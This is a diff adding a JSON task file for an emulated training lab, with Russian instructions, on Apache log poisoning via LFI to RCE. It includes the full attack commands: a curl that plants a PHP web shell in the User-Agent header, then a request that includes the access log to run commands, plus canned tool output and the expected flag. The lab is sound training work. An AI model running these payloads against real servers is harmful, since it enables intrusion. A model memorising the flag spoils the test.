@@ -1,0 +1,22 @@
+{
+  "id": "web-log-poisoning",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{l0g_p01s0n1ng_lf1_t0_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: log poisoning → RCE\n\nLFI на `https://shop.local/?page=`. Apache пишет `/var/log/apache2/access.log`,\nи в лог попадает наш заголовок User-Agent.\n\n1. Отравляем User-Agent PHP-кодом (веб-шелл):\n\n   curl -s 'https://shop.local/' -A '<?php system($_GET[\"c\"]); ?>'\n\n2. Включаем лог через LFI и выполняем команду (флаг — в flag.txt):\n\n   curl -s 'https://shop.local/?page=/var/log/apache2/access.log&c=cat flag.txt' > found.txt\n\n3. Набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local с LFI в ?page=)",
+      "cases": [
+        { "match": "access\\.log.*c=cat|access\\.log.*flag", "example": "-s 'https://shop.local/?page=/var/log/apache2/access.log&c=cat flag.txt'", "output": "127.0.0.1 - - [12/Oct/2026:10:01:02 +0000] \"GET / HTTP/1.1\" 200 512 \"-\" \"<?php system([\\\"c\\\"]); ?>\"\nnto{l0g_p01s0n1ng_lf1_t0_rce}\n" },
+        { "match": "access\\.log", "example": "-s 'https://shop.local/?page=/var/log/apache2/access.log'", "output": "127.0.0.1 - - [12/Oct/2026:10:01:02 +0000] \"GET / HTTP/1.1\" 200 512 \"-\" \"<?php system([\\\"c\\\"]); ?>\"\n" },
+        { "match": "system|User-Agent|-A", "example": "-s 'https://shop.local/' -A '<?php system($_GET[\"c\"]); ?>'", "output": "<html><body><h1>shop.local</h1></body></html>\n" },
+        { "match": "page=", "example": "-s 'https://shop.local/?page=home'", "output": "<html><body><h1>shop.local</h1></body></html>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только LFI-ручка /?page= на shop.local.\n"
+    }
+  }
+}
